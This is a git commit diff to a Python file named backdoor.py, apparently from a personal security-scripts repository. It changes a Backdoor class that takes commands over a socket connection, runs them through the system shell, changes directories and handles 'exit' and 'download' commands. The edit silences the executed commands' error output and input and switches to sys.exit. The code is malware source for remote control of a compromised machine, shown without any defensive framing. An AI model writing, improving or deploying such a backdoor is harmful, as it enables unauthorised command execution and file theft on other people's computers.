d47978251a70b2097c2c5afb5f30916635f250e8
SecureUniverse <64855572+SecureUniverse@users.noreply.github.com>
2021-10-23 10:29:47 +0330

    Update backdoor.py

--- Scripts/backdoor.py
+++ Scripts/backdoor.py
@@ -3,6 +3,7 @@ import socket
 import subprocess
 import json
 import base64
+import sys
 
 
 class Backdoor:
@@ -24,7 +25,7 @@ class Backdoor:
                 continue
 
     def execute_system_command(self, command):
-        return subprocess.check_output(command, shell=True)
+        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
 
     def change_working_directory_to(self, path):
         os.chdir(path)
@@ -46,7 +47,7 @@ class Backdoor:
             try:
                 if command[0] == "exit":
                     self.connection.close()
-                    exit()
+                    sys.exit()
                 elif command[0] == "cd" and len(command) > 1:
                     command_result = self.change_working_directory_to(command[1])
                 elif command[0] == "download":
